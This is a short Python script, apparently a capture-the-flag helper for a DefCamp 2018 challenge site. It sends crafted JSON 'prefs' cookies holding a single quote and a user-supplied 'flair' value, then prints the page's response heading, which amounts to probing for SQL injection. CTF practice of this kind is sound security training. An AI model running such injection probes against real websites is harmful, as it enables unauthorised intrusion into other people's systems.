import requests as req
import json
import sys
import re
from urllib.parse import quote, quote_plus


def post(x):
    headers = {
        "Cookie": "prefs=%s; path=/" % quote(json.dumps(x))
    }
    print('Cookie : %s -> %s' % (json.dumps(x), headers['Cookie']))
    res = req.get("https://secops.dctfq18.def.camp", headers=headers)
    if res.status_code == 200:
        html = res.content.decode('utf-8')
        m = re.findall(r'<h4 class="text-center">(.*?)</h4>', html)
        if m and len(m) > 0:
            print(m[0])
        else:
            print(html)
    else:
        print('Status : ', res.status_code)


def post2(x):
    pl = "{flair:%s}" % x
    headers = {
        "Cookie": "prefs=%s; path=/" % quote(pl)
    }
    print('Cookie : %s -> %s' % (pl, headers['Cookie']))
    res = req.get("https://secops.dctfq18.def.camp", headers=headers)
    if res.status_code == 200:
        html = res.content.decode('utf-8')
        m = re.findall(r'<h4 class="text-center">(.*?)</h4>', html)
        if m and len(m) > 0:
            print(m[0])
        else:
            print(html)
    else:
        print('Status : ', res.status_code)

if __name__ == '__main__':
    orz = "%s" % sys.argv[1] if len(sys.argv) > 1 else 1
    pl = {
        # "a": "select",
        "b": "'",
        "flair": orz,
        # "b": "'",
    }
    post(pl)
    # pl = "1"
    # post2(pl)
